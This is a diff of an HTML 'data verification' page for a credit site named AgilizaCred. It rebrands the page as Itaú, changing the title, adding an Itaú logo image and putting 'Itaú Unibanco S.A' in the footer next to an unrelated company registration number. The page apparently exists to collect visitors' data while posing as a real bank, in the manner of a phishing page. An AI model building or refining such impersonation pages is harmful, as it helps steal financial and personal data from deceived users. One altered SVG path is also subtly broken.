@@ -10,7 +10,7 @@
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AgilizaCred – Verificação de Dados</title>
+  <title>Itaú – Verificação de Dados</title>
 
   <style>
     @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Outfit:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
@@ -146,6 +146,27 @@
       color: #22C55E;
       letter-spacing: -0.5px;
       line-height: 1;
+    }
+
+    /* ✅ NOVO: logo como imagem (header/rodapé) */
+    .brand-logo{
+      display:flex;
+      align-items:center;
+      user-select:none;
+      text-decoration:none;
+      line-height:0;
+    }
+    .brand-logo img{
+      display:block;
+      height: 26px;          /* ajuste se quiser */
+      width: auto;
+      max-width: 190px;      /* evita estourar no mobile */
+      object-fit: contain;
+    }
+    .footer-logo-img img{
+      height: 20px;          /* ajuste se quiser */
+      max-width: 180px;
+      opacity: 0.95;
     }
 
     .header-right{
@@ -746,7 +767,11 @@
           <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
         </svg>
       </div>
-      <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+
+      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images) -->
+      <a class="brand-logo" href="#" aria-label="AgilizaCred">
+        <img src="/images/itau2.png" alt="AgilizaCred - Crédito Fácil">
+      </a>
     </div>
     <div class="header-right">
       <div class="header-icon">
@@ -905,10 +930,13 @@
 
 <footer class="site-footer">
   <div class="footer-inner">
-    <div class="footer-logo">
-      <span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span>
-    </div>
-    <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>
+
+    <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images) -->
+    <a class="brand-logo footer-logo-img" href="#" aria-label="AgilizaCred">
+      <img src="/images/itau2.png" alt="AgilizaCred - Crédito Fácil">
+    </a>
+
+    <small><strong>Itaú Unibanco S.A</strong><br>
     CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
     <div class="footer-badges">
       <span>
@@ -916,7 +944,7 @@
         SSL Seguro
       </span>
       <span>
-        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
         Dados protegidos
       </span>
       <span>
